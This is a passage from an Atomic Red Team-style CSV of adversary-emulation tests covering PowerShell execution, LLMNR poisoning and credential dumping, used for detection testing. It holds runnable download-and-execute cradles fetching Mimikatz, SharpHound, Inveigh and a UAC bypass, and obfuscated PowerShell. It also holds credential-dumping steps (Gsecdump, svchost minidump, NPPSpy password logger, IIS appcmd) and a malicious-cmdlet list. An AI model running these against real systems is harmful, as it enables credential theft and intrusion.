input_arguments.nircmd_location.default: PathToAtomicsFolder\..\ExternalPayloads\nircmd.exe

input_arguments.command_to_execute.description: Command for nircmd to execute

input_arguments.command_to_execute.type: Path

input_arguments.command_to_execute.default: win child class ""Shell_TrayWnd"" hide class ""TrayClockWClass""

input_arguments.cleanup_command_to_execute.description: Cleanup command to undo the arbitrary command ran by nircmd

input_arguments.cleanup_command_to_execute.type: Path

input_arguments.cleanup_command_to_execute.default: win child class ""Shell_TrayWnd"" show class ""TrayClockWClass""

"
T1059.001,Command and Scripting Interpreter: PowerShell,Mimikatz,f3132740-55bc-48c4-bcc0-758a459cd027,"Download Mimikatz and dump credentials. Upon execution, mimikatz dump details and password hashes will be displayed.
",windows,,,"powershell.exe ""IEX (New-Object Net.WebClient).DownloadString('#{mimurl}'); Invoke-Mimikatz -DumpCreds""
",command_prompt,True,,,,,"input_arguments.mimurl.description: Mimikatz url

input_arguments.mimurl.type: url

input_arguments.mimurl.default: https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/f650520c4b1004daf8b3ec08007a0b945b91253a/Exfiltration/Invoke-Mimikatz.ps1

"
T1059.001,Command and Scripting Interpreter: PowerShell,Run BloodHound from local disk,a21bb23e-e677-4ee7-af90-6931b57b6350,"Upon execution SharpHound will be downloaded to disk, imported and executed. It will set up collection methods, run and then compress and store the data to the temp directory on the machine. If system is unable to contact a domain, proper execution will not occur.

Successful execution will produce stdout message stating ""SharpHound Enumeration Completed"". Upon completion, final output will be a *BloodHound.zip file.
",windows,,,"import-module ""PathToAtomicsFolder\..\ExternalPayloads\SharpHound.ps1""
try { Invoke-BloodHound -OutputDirectory $env:Temp }
catch { $_; exit $_.Exception.HResult}
Start-Sleep 5
",powershell,,,"Remove-Item $env:Temp\*BloodHound.zip -Force
",powershell,"dependencies.0.description: SharpHound.ps1 must be located at ""PathToAtomicsFolder\..\ExternalPayloads\SharpHound.ps1""

dependencies.0.prereq_command: if (Test-Path ""PathToAtomicsFolder\..\ExternalPayloads\SharpHound.ps1"") {exit 0} else {exit 1}

dependencies.0.get_prereq_command: New-Item -Type Directory ""PathToAtomicsFolder\..\ExternalPayloads\"" -ErrorAction Ignore -Force | Out-Null
Invoke-WebRequest ""https://raw.githubusercontent.com/BloodHoundAD/BloodHound/804503962b6dc554ad7d324cfa7f2b4a566a14e2/Ingestors/SharpHound.ps1"" -OutFile ""PathToAtomicsFolder\..\ExternalPayloads\SharpHound.ps1""

",
T1059.001,Command and Scripting Interpreter: PowerShell,Run Bloodhound from Memory using Download Cradle,bf8c1441-4674-4dab-8e4e-39d93d08f9b7,"Upon execution SharpHound will load into memory and execute against a domain. It will set up collection methods, run and then compress and store the data to the temp directory. If system is unable to contact a domain, proper execution will not occur.

Successful execution will produce stdout message stating ""SharpHound Enumeration Completed"". Upon completion, final output will be a *BloodHound.zip file.
",windows,,,"write-host ""Remote download of SharpHound.ps1 into memory, followed by execution of the script"" -ForegroundColor Cyan
IEX (New-Object Net.Webclient).DownloadString('https://raw.githubusercontent.com/BloodHoundAD/BloodHound/804503962b6dc554ad7d324cfa7f2b4a566a14e2/Ingestors/SharpHound.ps1');
Invoke-BloodHound -OutputDirectory $env:Temp
Start-Sleep 5
",powershell,,,"Remove-Item $env:Temp\*BloodHound.zip -Force
",,,
T1059.001,Command and Scripting Interpreter: PowerShell,Obfuscation Tests,4297c41a-8168-4138-972d-01f3ee92c804,"Different obfuscated methods to test. Upon execution, reaches out to bit.ly/L3g1t and displays: ""SUCCESSFULLY EXECUTED POWERSHELL CODE FROM REMOTE LOCATION""
",windows,,,"(New-Object Net.WebClient).DownloadFile('http://bit.ly/L3g1tCrad1e','Default_File_Path.ps1');IEX((-Join([IO.File]::ReadAllBytes('Default_File_Path.ps1')|ForEach-Object{[Char]$_})))
(New-Object Net.WebClient).DownloadFile('http://bit.ly/L3g1tCrad1e','Default_File_Path.ps1');[ScriptBlock]::Create((-Join([IO.File]::ReadAllBytes('Default_File_Path.ps1')|ForEach-Object{[Char]$_}))).InvokeReturnAsIs()
Set-Variable HJ1 'http://bit.ly/L3g1tCrad1e';SI Variable:/0W 'Net.WebClient';Set-Item Variable:\gH 'Default_File_Path.ps1';ls _-*;Set-Variable igZ (.$ExecutionContext.InvokeCommand.(($ExecutionContext.InvokeCommand.PsObject.Methods|?{$_.Name-like'*Cm*t'}).Name).Invoke($ExecutionContext.InvokeCommand.(($ExecutionContext.InvokeCommand|GM|?{$_.Name-like'*om*e'}).Name).Invoke('*w-*ct',$TRUE,1))(Get-ChildItem Variable:0W).Value);Set-Variable J ((((Get-Variable igZ -ValueOn)|GM)|?{$_.Name-like'*w*i*le'}).Name);(Get-Variable igZ -ValueOn).((ChildItem Variable:J).Value).Invoke((Get-Item Variable:/HJ1).Value,(GV gH).Value);&( ''.IsNormalized.ToString()[13,15,48]-Join'')(-Join([Char[]](CAT -Enco 3 (GV gH).Value)))
",powershell,,,,,,
T1059.001,Command and Scripting Interpreter: PowerShell,Mimikatz - Cradlecraft PsSendKeys,af1800cf-9f9d-4fd1-a709-14b1e6de020d,"Run mimikatz via PsSendKeys. Upon execution, automated actions will take place to open file explorer, open notepad and input code, then mimikatz dump info will be displayed.
",windows,,,"$url='https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/f650520c4b1004daf8b3ec08007a0b945b91253a/Exfiltration/Invoke-Mimikatz.ps1';$wshell=New-Object -ComObject WScript.Shell;$reg='HKCU:\Software\Microsoft\Notepad';$app='Notepad';$props=(Get-ItemProperty $reg);[Void][System.Reflection.Assembly]::LoadWithPartialName('System.Windows.Forms');@(@('iWindowPosY',([String]([System.Windows.Forms.Screen]::AllScreens)).Split('}')[0].Split('=')[5]),@('StatusBar',0))|ForEach{SP $reg (Item Variable:_).Value[0] (Variable _).Value[1]};$curpid=$wshell.Exec($app).ProcessID;While(!($title=GPS|?{(Item Variable:_).Value.id-ieq$curpid}|ForEach{(Variable _).Value.MainWindowTitle})){Start-Sleep -Milliseconds 500};While(!$wshell.AppActivate($title)){Start-Sleep -Milliseconds 500};$wshell.SendKeys('^o');Start-Sleep -Milliseconds 500;@($url,(' '*1000),'~')|ForEach{$wshell.SendKeys((Variable _).Value)};$res=$Null;While($res.Length -lt 2){[Windows.Forms.Clipboard]::Clear();@('^a','^c')|ForEach{$wshell.SendKeys((Item Variable:_).Value)};Start-Sleep -Milliseconds 500;$res=([Windows.Forms.Clipboard]::GetText())};[Windows.Forms.Clipboard]::Clear();@('%f','x')|ForEach{$wshell.SendKeys((Variable _).Value)};If(GPS|?{(Item Variable:_).Value.id-ieq$curpid}){@('{TAB}','~')|ForEach{$wshell.SendKeys((Item Variable:_).Value)}};@('iWindowPosDY','iWindowPosDX','iWindowPosY','iWindowPosX','StatusBar')|ForEach{SP $reg (Item Variable:_).Value $props.((Variable _).Value)};IEX($res);invoke-mimikatz -dumpcr
",powershell,True,,,,,
T1059.001,Command and Scripting Interpreter: PowerShell,Invoke-AppPathBypass,06a220b6-7e29-4bd8-9d07-5b4d86742372,"Note: Windows 10 only. Upon execution windows backup and restore window will be opened.

Bypass is based on: https://enigma0x3.net/2017/03/14/bypassing-uac-using-app-paths/
",windows,,,"Powershell.exe ""IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/enigma0x3/Misc-PowerShell-Stuff/a0dfca7056ef20295b156b8207480dc2465f94c3/Invoke-AppPathBypass.ps1'); Invoke-AppPathBypass -Payload 'C:\Windows\System32\cmd.exe'""
",command_prompt,,,,,,
T1059.001,Command and Scripting Interpreter: PowerShell,Powershell MsXml COM object - with prompt,388a7340-dbc1-4c9d-8e59-b75ad8c6d5da,"Powershell MsXml COM object. Not proxy aware, removing cache although does not appear to write to those locations. Upon execution, ""Download Cradle test success!"" will be displayed.

Provided by https://github.com/mgreen27/mgreen27.github.io
",windows,,,"powershell.exe -exec bypass -noprofile ""$comMsXml=New-Object -ComObject MsXml2.ServerXmlHttp;$comMsXml.Open('GET','#{url}',$False);$comMsXml.Send();IEX $comMsXml.ResponseText""
",command_prompt,,,,,,"input_arguments.url.description: url of payload to execute

input_arguments.url.type: url

input_arguments.url.default: https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1059.001/src/test.ps1

"
T1059.001,Command and Scripting Interpreter: PowerShell,Powershell XML requests,4396927f-e503-427b-b023-31049b9b09a6,"Powershell xml download request. Upon execution, ""Download Cradle test success!"" will be dispalyed.

Provided by https://github.com/mgreen27/mgreen27.github.io
",windows,,,"""C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"" -exec bypass -noprofile ""$Xml = (New-Object System.Xml.XmlDocument);$Xml.Load('#{url}');$Xml.command.a.execute | IEX""
",command_prompt,,,,,,"input_arguments.url.description: url of payload to execute

input_arguments.url.type: url

input_arguments.url.default: https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1059.001/src/test.xml

"
T1059.001,Command and Scripting Interpreter: PowerShell,Powershell invoke mshta.exe download,8a2ad40b-12c7-4b25-8521-2737b0a415af,"Powershell invoke mshta to download payload. Upon execution, a new PowerShell window will be opened which will display ""Download Cradle test success!"".

Provided by https://github.com/mgreen27/mgreen27.github.io
",windows,,,"C:\Windows\system32\cmd.exe /c ""mshta.exe javascript:a=GetObject('script:#{url}').Exec();close()""
",command_prompt,,,,,,"input_arguments.url.description: url of payload to execute

input_arguments.url.type: url

input_arguments.url.default: https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1059.001/src/mshta.sct

"
T1059.001,Command and Scripting Interpreter: PowerShell,Powershell Invoke-DownloadCradle,cc50fa2a-a4be-42af-a88f-e347ba0bf4d7,"Provided by https://github.com/mgreen27/mgreen27.github.io
Invoke-DownloadCradle is used to generate Network and Endpoint artifacts.
",windows,,,,manual,,"1. Open Powershell_ise as a Privileged Account
2. Invoke-DownloadCradle.ps1
",,,,
T1059.001,Command and Scripting Interpreter: PowerShell,PowerShell Fileless Script Execution,fa050f5e-bc75-4230-af73-b6fd7852cd73,"Execution of a PowerShell payload from the Windows Registry similar to that seen in fileless malware infections. Upon exection, open ""C:\Windows\Temp"" and verify that
art-marker.txt is in the folder.
",windows,,,"# Encoded payload in next command is the following ""Set-Content -path ""$env:SystemRoot/Temp/art-marker.txt"" -value ""Hello from the Atomic Red Team""""
reg.exe add ""HKEY_CURRENT_USER\Software\Classes\AtomicRedTeam"" /v ART /t REG_SZ /d ""U2V0LUNvbnRlbnQgLXBhdGggIiRlbnY6U3lzdGVtUm9vdC9UZW1wL2FydC1tYXJrZXIudHh0IiAtdmFsdWUgIkhlbGxvIGZyb20gdGhlIEF0b21pYyBSZWQgVGVhbSI="" /f
iex ([Text.Encoding]::ASCII.GetString([Convert]::FromBase64String((gp 'HKCU:\Software\Classes\AtomicRedTeam').ART)))
",powershell,,,"Remove-Item -path C:\Windows\Temp\art-marker.txt -Force -ErrorAction Ignore
Remove-Item HKCU:\Software\Classes\AtomicRedTeam -Force -ErrorAction Ignore
",,,
T1059.001,Command and Scripting Interpreter: PowerShell,PowerShell Downgrade Attack,9148e7c4-9356-420e-a416-e896e9c0f73e,"This test requires the manual installation of PowerShell V2.

Attempts to run powershell commands in version 2.0 https://www.leeholmes.com/blog/2017/03/17/detecting-and-preventing-powershell-downgrade-attacks/
",windows,,,"powershell.exe -version 2 -Command Write-Host $PSVersion
",powershell,,,,,"dependencies.0.description: PowerShell version 2 must be installed

dependencies.0.prereq_command: if(2 -in $PSVersionTable.PSCompatibleVersions.Major) {exit 0} else {exit 1}

dependencies.0.get_prereq_command: Write-Host  Automated installer not implemented yet, please install PowerShell v2 manually

",
T1059.001,Command and Scripting Interpreter: PowerShell,NTFS Alternate Data Stream Access,8e5c5532-1181-4c1d-bb79-b3a9f5dbd680,"Creates a file with an alternate data stream and simulates executing that hidden code/file. Upon execution, ""Stream Data Executed"" will be displayed.
",windows,,,"Add-Content -Path #{ads_file} -Value 'Write-Host ""Stream Data Executed""' -Stream 'streamCommand'
$streamcommand = Get-Content -Path #{ads_file} -Stream 'streamcommand'
Invoke-Expression $streamcommand
",powershell,,,"Remove-Item #{ads_file} -Force -ErrorAction Ignore
",,"dependencies.0.description: Homedrive must be an NTFS drive

dependencies.0.prereq_command: if((Get-Volume -DriveLetter $env:HOMEDRIVE[0]).FileSystem -contains ""NTFS"") {exit 0} else {exit 1}

dependencies.0.get_prereq_command: Write-Host Prereq's for this test cannot be met automatically

","input_arguments.ads_file.description: File created to store Alternate Stream Data

input_arguments.ads_file.type: string

input_arguments.ads_file.default: $env:TEMP\NTFS_ADS.txt

"
T1059.001,Command and Scripting Interpreter: PowerShell,PowerShell Session Creation and Use,7c1acec2-78fa-4305-a3e0-db2a54cddecd,"Connect to a remote powershell session and interact with the host.
Upon execution, network test info and 'T1086 PowerShell Session Creation and Use' will be displayed.
",windows,,,"New-PSSession -ComputerName #{hostname_to_connect}
Test-Connection $env:COMPUTERNAME
Set-Content -Path $env:TEMP\T1086_PowerShell_Session_Creation_and_Use -Value ""T1086 PowerShell Session Creation and Use""
Get-Content -Path $env:TEMP\T1086_PowerShell_Session_Creation_and_Use
Remove-Item -Force $env:TEMP\T1086_PowerShell_Session_Creation_and_Use
",powershell,True,,,,"dependencies.0.description: PSRemoting must be enabled

dependencies.0.prereq_command: Try {
    New-PSSession -ComputerName #{hostname_to_connect} -ErrorAction Stop | Out-Null
    exit 0
} 
Catch {
    exit 1
}

dependencies.0.get_prereq_command: Enable-PSRemoting

","input_arguments.hostname_to_connect.description: The host to connect to, by default it will connect to the local machine

input_arguments.hostname_to_connect.type: string

input_arguments.hostname_to_connect.default: $env:COMPUTERNAME

"
T1059.001,Command and Scripting Interpreter: PowerShell,ATHPowerShellCommandLineParameter -Command parameter variations,686a9785-f99b-41d4-90df-66ed515f81d7,Executes powershell.exe with variations of the -Command parameter,windows,,,Out-ATHPowerShellCommandLineParameter -CommandLineSwitchType #{command_line_switch_type} -CommandParamVariation #{command_param_variation} -Execute -ErrorAction Stop,powershell,,,,,"dependencies.0.description: The AtomicTestHarnesses module must be installed and Out-ATHPowerShellCommandLineParameter must be exported in the module.
dependencies.0.prereq_command: $RequiredModule = Get-Module -Name AtomicTestHarnesses -ListAvailable
if (-not $RequiredModule) {exit 1}
if (-not $RequiredModule.ExportedCommands['Out-ATHPowerShellCommandLineParameter']) {exit 1} else {exit 0}
dependencies.0.get_prereq_command: Install-Module -Name AtomicTestHarnesses -Scope CurrentUser -Force

","input_arguments.command_line_switch_type.description: The type of supported command-line switch to use

input_arguments.command_line_switch_type.type: string

input_arguments.command_line_switch_type.default: Hyphen

input_arguments.command_param_variation.description: The ""Command"" parameter variation to use

input_arguments.command_param_variation.type: string

input_arguments.command_param_variation.default: C

"
T1059.001,Command and Scripting Interpreter: PowerShell,ATHPowerShellCommandLineParameter -Command parameter variations with encoded arguments,1c0a870f-dc74-49cf-9afc-eccc45e58790,Executes powershell.exe with variations of the -Command parameter with encoded arguments supplied,windows,,,Out-ATHPowerShellCommandLineParameter -CommandLineSwitchType #{command_line_switch_type} -CommandParamVariation #{command_param_variation} -UseEncodedArguments -EncodedArgumentsParamVariation #{encoded_arguments_param_variation} -Execute -ErrorAction Stop,powershell,,,,,"dependencies.0.description: The AtomicTestHarnesses module must be installed and Out-ATHPowerShellCommandLineParameter must be exported in the module.
dependencies.0.prereq_command: $RequiredModule = Get-Module -Name AtomicTestHarnesses -ListAvailable
if (-not $RequiredModule) {exit 1}
if (-not $RequiredModule.ExportedCommands['Out-ATHPowerShellCommandLineParameter']) {exit 1} else {exit 0}
dependencies.0.get_prereq_command: Install-Module -Name AtomicTestHarnesses -Scope CurrentUser -Force

","input_arguments.command_line_switch_type.description: The type of supported command-line switch to use

input_arguments.command_line_switch_type.type: string

input_arguments.command_line_switch_type.default: Hyphen

input_arguments.command_param_variation.description: The ""Command"" parameter variation to use

input_arguments.command_param_variation.type: string

input_arguments.command_param_variation.default: C

input_arguments.encoded_arguments_param_variation.description: The ""EncodedArguments"" parameter variation to use

input_arguments.encoded_arguments_param_variation.type: string

input_arguments.encoded_arguments_param_variation.default: EA

"
T1059.001,Command and Scripting Interpreter: PowerShell,ATHPowerShellCommandLineParameter -EncodedCommand parameter variations,86a43bad-12e3-4e85-b97c-4d5cf25b95c3,Executes powershell.exe with variations of the -EncodedCommand parameter,windows,,,Out-ATHPowerShellCommandLineParameter -CommandLineSwitchType #{command_line_switch_type} -EncodedCommandParamVariation #{encoded_command_param_variation} -Execute -ErrorAction Stop,powershell,,,,,"dependencies.0.description: The AtomicTestHarnesses module must be installed and Out-ATHPowerShellCommandLineParameter must be exported in the module.
dependencies.0.prereq_command: $RequiredModule = Get-Module -Name AtomicTestHarnesses -ListAvailable
if (-not $RequiredModule) {exit 1}
if (-not $RequiredModule.ExportedCommands['Out-ATHPowerShellCommandLineParameter']) {exit 1} else {exit 0}
dependencies.0.get_prereq_command: Install-Module -Name AtomicTestHarnesses -Scope CurrentUser -Force

","input_arguments.command_line_switch_type.description: The type of supported command-line switch to use

input_arguments.command_line_switch_type.type: string

input_arguments.command_line_switch_type.default: Hyphen

input_arguments.encoded_command_param_variation.description: The ""EncodedCommand"" parameter variation to use

input_arguments.encoded_command_param_variation.type: string

input_arguments.encoded_command_param_variation.default: E

"
T1059.001,Command and Scripting Interpreter: PowerShell,ATHPowerShellCommandLineParameter -EncodedCommand parameter variations with encoded arguments,0d181431-ddf3-4826-8055-2dbf63ae848b,Executes powershell.exe with variations of the -EncodedCommand parameter with encoded arguments supplied,windows,,,Out-ATHPowerShellCommandLineParameter -CommandLineSwitchType #{command_line_switch_type} -EncodedCommandParamVariation #{encoded_command_param_variation} -UseEncodedArguments -EncodedArgumentsParamVariation #{encoded_arguments_param_variation} -Execute -ErrorAction Stop,powershell,,,,,"dependencies.0.description: The AtomicTestHarnesses module must be installed and Out-ATHPowerShellCommandLineParameter must be exported in the module.
dependencies.0.prereq_command: $RequiredModule = Get-Module -Name AtomicTestHarnesses -ListAvailable
if (-not $RequiredModule) {exit 1}
if (-not $RequiredModule.ExportedCommands['Out-ATHPowerShellCommandLineParameter']) {exit 1} else {exit 0}
dependencies.0.get_prereq_command: Install-Module -Name AtomicTestHarnesses -Scope CurrentUser -Force

","input_arguments.encoded_command_param_variation.description: The ""EncodedCommand"" parameter variation to use

input_arguments.encoded_command_param_variation.type: string

input_arguments.encoded_command_param_variation.default: E

input_arguments.command_line_switch_type.description: The type of supported command-line switch to use

input_arguments.command_line_switch_type.type: string

input_arguments.command_line_switch_type.default: Hyphen

input_arguments.encoded_arguments_param_variation.description: The ""EncodedArguments"" parameter variation to use

input_arguments.encoded_arguments_param_variation.type: string

input_arguments.encoded_arguments_param_variation.default: EncodedArguments

"
T1059.001,Command and Scripting Interpreter: PowerShell,PowerShell Command Execution,a538de64-1c74-46ed-aa60-b995ed302598,"Use of obfuscated PowerShell to execute an arbitrary command; outputs ""Hello, from PowerShell!"". Example is from the 2021 Threat Detection Report by Red Canary.
",windows,,,"powershell.exe -e  #{obfuscated_code}
",command_prompt,,,,,,"input_arguments.obfuscated_code.description: Defaults to: Invoke-Expression with a ""Write-Host"" line.

input_arguments.obfuscated_code.type: string

input_arguments.obfuscated_code.default: JgAgACgAZwBjAG0AIAAoACcAaQBlAHsAMAB9ACcAIAAtAGYAIAAnAHgAJwApACkAIAAoACIAVwByACIAKwAiAGkAdAAiACsAIgBlAC0ASAAiACsAIgBvAHMAdAAgACcASAAiACsAIgBlAGwAIgArACIAbABvACwAIABmAHIAIgArACIAbwBtACAAUAAiACsAIgBvAHcAIgArACIAZQByAFMAIgArACIAaAAiACsAIgBlAGwAbAAhACcAIgApAA==

"
T1059.001,Command and Scripting Interpreter: PowerShell,PowerShell Invoke Known Malicious Cmdlets,49eb9404-5e0f-4031-a179-b40f7be385e3,Powershell execution of known Malicious PowerShell Cmdlets,windows,,,"$malcmdlets = #{Malicious_cmdlets}
foreach ($cmdlets in $malcmdlets) {
    ""function $cmdlets { Write-Host Pretending to invoke $cmdlets }""}
foreach ($cmdlets in $malcmdlets) {
    $cmdlets}
",powershell,True,,,,,"input_arguments.Malicious_cmdlets.description: Known Malicious Cmdlets

input_arguments.Malicious_cmdlets.type: string

input_arguments.Malicious_cmdlets.default: ""Add-Persistence"", ""Find-AVSignature"", ""Get-GPPAutologon"", ""Get-GPPPassword"", ""Get-HttpStatus"", ""Get-Keystrokes"", ""Get-SecurityPackages"", ""Get-TimedScreenshot"", ""Get-VaultCredential"", ""Get-VolumeShadowCopy"", ""Install-SSP"", ""Invoke-CredentialInjection"", ""Invoke-DllInjection"", ""Invoke-Mimikatz"", ""Invoke-NinjaCopy"", ""Invoke-Portscan"", ""Invoke-ReflectivePEInjection"", ""Invoke-ReverseDnsLookup"", ""Invoke-Shellcode"", ""Invoke-TokenManipulation"", ""Invoke-WmiCommand"", ""Mount-VolumeShadowCopy"", ""New-ElevatedPersistenceOption"", ""New-UserPersistenceOption"", ""New-VolumeShadowCopy"", ""Out-CompressedDll"", ""Out-EncodedCommand"", ""Out-EncryptedScript"", ""Out-Minidump"", ""PowerUp"", ""PowerView"", ""Remove-Comments"", ""Remove-VolumeShadowCopy"", ""Set-CriticalProcess"", ""Set-MasterBootRecord""


"
T1059.001,Command and Scripting Interpreter: PowerShell,PowerUp Invoke-AllChecks,1289f78d-22d2-4590-ac76-166737e1811b,"Check for privilege escalation paths using PowerUp from PowerShellMafia
",windows,,,"[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
iex(iwr https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/d943001a7defb5e0d1657085a77a0e78609be58f/Privesc/PowerUp.ps1 -UseBasicParsing)
Invoke-AllChecks
",powershell,,,,,,
T1059.001,Command and Scripting Interpreter: PowerShell,Abuse Nslookup with DNS Records,999bff6d-dc15-44c9-9f5c-e1051bfc86e1,"Red teamer's avoid IEX and Invoke-WebRequest in your PowerShell commands. Instead, host a text record with a payload to compromise hosts.
[reference](https://twitter.com/jstrosch/status/1237382986557001729)
",windows,,,"# creating a custom nslookup function that will indeed call nslookup but forces the result to be ""whoami""
# this would not be part of a real attack but helpful for this simulation
function nslookup  { &""$env:windir\system32\nslookup.exe"" @args | Out-Null; @("""",""whoami"")}
powershell .(nslookup -q=txt example.com 8.8.8.8)[-1]
",powershell,,,,,,
T1557.001,Adversary-in-the-Middle: LLMNR/NBT-NS Poisoning and SMB Relay,LLMNR Poisoning with Inveigh (PowerShell),deecd55f-afe0-4a62-9fba-4d1ba2deb321,Inveigh conducts spoofing attacks and hash/credential captures through both packet sniffing and protocol specific listeners/sockets. This Atomic will run continuously until you cancel it or it times out.,windows,,,"[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
IEX (iwr ""https://raw.githubusercontent.com/Kevin-Robertson/Inveigh/82be2377ade47a4e325217b4144878a59595e750/Inveigh.ps1"" -UseBasicParsing)
Invoke-Inveigh -ConsoleOutput Y -NBNS Y -MDNS Y -HTTPS Y -PROXY Y",powershell,True,,,,,
T1003,OS Credential Dumping,Gsecdump,96345bfc-8ae7-4b6a-80b7-223200f24ef9,"Dump credentials from memory using Gsecdump.

Upon successful execution, you should see domain\username's followed by two 32 character hashes.

If you see output that says ""compat: error: failed to create child process"", execution was likely blocked by Anti-Virus. 
You will receive only error output if you do not run this test from an elevated context (run as administrator)

If you see a message saying ""The system cannot find the path specified"", try using the get-prereq_commands to download and install Gsecdump first.
",windows,,,"""#{gsecdump_exe}"" -a
",command_prompt,True,,,powershell,"dependencies.0.description: Gsecdump must exist on disk at specified location (#{gsecdump_exe})

dependencies.0.prereq_command: if (Test-Path ""#{gsecdump_exe}"") {exit 0} else {exit 1}

dependencies.0.get_prereq_command: [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
$parentpath = Split-Path ""#{gsecdump_exe}""; $binpath = ""$parentpath\gsecdump-v2b5.exe""
IEX(IWR ""https://raw.githubusercontent.com/redcanaryco/invoke-atomicredteam/master/Public/Invoke-WebRequestVerifyHash.ps1"" -UseBasicParsing)
if(Invoke-WebRequestVerifyHash ""#{gsecdump_url}"" ""$binpath"" #{gsecdump_bin_hash}){
  Move-Item $binpath ""#{gsecdump_exe}""
}

","input_arguments.gsecdump_exe.description: Path to the Gsecdump executable

input_arguments.gsecdump_exe.type: path

input_arguments.gsecdump_exe.default: PathToAtomicsFolder\..\ExternalPayloads\gsecdump.exe

input_arguments.gsecdump_bin_hash.description: File hash of the Gsecdump binary file

input_arguments.gsecdump_bin_hash.type: string

input_arguments.gsecdump_bin_hash.default: 94CAE63DCBABB71C5DD43F55FD09CAEFFDCD7628A02A112FB3CBA36698EF72BC

input_arguments.gsecdump_url.description: Path to download Gsecdump binary file

input_arguments.gsecdump_url.type: url

input_arguments.gsecdump_url.default: https://web.archive.org/web/20150606043951if_/http://www.truesec.se/Upload/Sakerhet/Tools/gsecdump-v2b5.exe

"
T1003,OS Credential Dumping,Credential Dumping with NPPSpy,9e2173c0-ba26-4cdf-b0ed-8c54b27e3ad6,"Changes ProviderOrder Registry Key Parameter and creates Key for NPPSpy.
After user's logging in cleartext password is saved in C:\NPPSpy.txt.
Clean up deletes the files and reverses Registry changes.
NPPSpy Source: https://github.com/gtworek/PSBits/tree/master/PasswordStealing/NPPSpy",windows,,,"Copy-Item ""PathToAtomicsFolder\..\ExternalPayloads\NPPSPY.dll"" -Destination ""C:\Windows\System32""
$path = Get-ItemProperty -Path ""HKLM:\SYSTEM\CurrentControlSet\Control\NetworkProvider\Order"" -Name PROVIDERORDER
$UpdatedValue = $Path.PROVIDERORDER + "",NPPSpy""
Set-ItemProperty -Path $Path.PSPath -Name ""PROVIDERORDER"" -Value $UpdatedValue
$rv = New-Item -Path HKLM:\SYSTEM\CurrentControlSet\Services\NPPSpy -ErrorAction Ignore
$rv = New-Item -Path HKLM:\SYSTEM\CurrentControlSet\Services\NPPSpy\NetworkProvider -ErrorAction Ignore
$rv = New-ItemProperty -Path HKLM:\SYSTEM\CurrentControlSet\Services\NPPSpy\NetworkProvider -Name ""Class"" -Value 2 -ErrorAction Ignore
$rv = New-ItemProperty -Path HKLM:\SYSTEM\CurrentControlSet\Services\NPPSpy\NetworkProvider -Name ""Name"" -Value NPPSpy -ErrorAction Ignore
$rv = New-ItemProperty -Path HKLM:\SYSTEM\CurrentControlSet\Services\NPPSpy\NetworkProvider -Name ""ProviderPath"" -PropertyType ExpandString -Value ""%SystemRoot%\System32\NPPSPY.dll"" -ErrorAction Ignore
echo ""[!] Please, logout and log back in. Cleartext password for this account is going to be located in C:\NPPSpy.txt""",powershell,True,,"$cleanupPath = Get-ItemProperty -Path ""HKLM:\SYSTEM\CurrentControlSet\Control\NetworkProvider\Order"" -Name PROVIDERORDER
$cleanupUpdatedValue = $cleanupPath.PROVIDERORDER 
$cleanupUpdatedValue = $cleanupUpdatedValue -replace ',NPPSpy',''
Set-ItemProperty -Path $cleanupPath.PSPath -Name ""PROVIDERORDER"" -Value $cleanupUpdatedValue
Remove-Item -Path ""HKLM:\SYSTEM\CurrentControlSet\Services\NPPSpy"" -Recurse -ErrorAction Ignore
Remove-Item C:\NPPSpy.txt -ErrorAction Ignore
Remove-Item C:\Windows\System32\NPPSpy.dll -ErrorAction Ignore",powershell,"dependencies.0.description: NPPSpy.dll must be available in ExternalPayloads directory
dependencies.0.prereq_command: if (Test-Path ""PathToAtomicsFolder\..\ExternalPayloads\NPPSPY.dll"") {exit 0} else {exit 1}
dependencies.0.get_prereq_command: [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
New-Item -Type Directory ""PathToAtomicsFolder\..\ExternalPayloads\"" -ErrorAction Ignore -Force | Out-Null
Invoke-WebRequest -Uri https://github.com/gtworek/PSBits/raw/f221a6db08cb3b52d5f8a2a210692ea8912501bf/PasswordStealing/NPPSpy/NPPSPY.dll -OutFile ""PathToAtomicsFolder\..\ExternalPayloads\NPPSPY.dll""
",
T1003,OS Credential Dumping,Dump svchost.exe to gather RDP credentials,d400090a-d8ca-4be0-982e-c70598a23de9,"The svchost.exe contains the RDP plain-text credentials.
Source: https://www.n00py.io/2021/05/dumping-plaintext-rdp-credentials-from-svchost-exe/

Upon successful execution, you should see the following file created $env:TEMP\svchost-exe.dmp.
",windows,,,"$ps = (Get-NetTCPConnection -LocalPort 3389 -State Established -ErrorAction Ignore)
if($ps){$id = $ps[0].OwningProcess} else {$id = (Get-Process svchost)[0].Id }
C:\Windows\System32\rundll32.exe C:\windows\System32\comsvcs.dll, MiniDump $id $env:TEMP\svchost-exe.dmp full
",powershell,True,,"Remove-Item $env:TEMP\svchost-exe.dmp -ErrorAction Ignore
",,,
T1003,OS Credential Dumping,Retrieve Microsoft IIS Service Account Credentials Using AppCmd (using list),6c7a4fd3-5b0b-4b30-a93e-39411b25d889,"AppCmd.exe is a command line utility which is used for managing an IIS web server. The list command within the tool reveals the service account credentials configured for the webserver. An adversary may use these credentials for other malicious purposes.
[Reference](https://twitter.com/0gtweet/status/1588815661085917186?cxt=HHwWhIDUyaDbzYwsAAAA)",windows,,,"C:\Windows\System32\inetsrv\appcmd.exe list apppool /@t:*
C:\Windows\System32\inetsrv\appcmd.exe list apppool /@text:*
C:\Windows\System32\inetsrv\appcmd.exe list apppool /text:*",powershell,True,,,powershell,"dependencies.0.description: IIS must be installed prior to running the test
dependencies.0.prereq_command: if ((Get-WindowsFeature Web-Server).InstallState -eq ""Installed"") {exit 0} else {exit 1}
dependencies.0.get_prereq_command: Install-WindowsFeature -name Web-Server -IncludeManagementTools
",
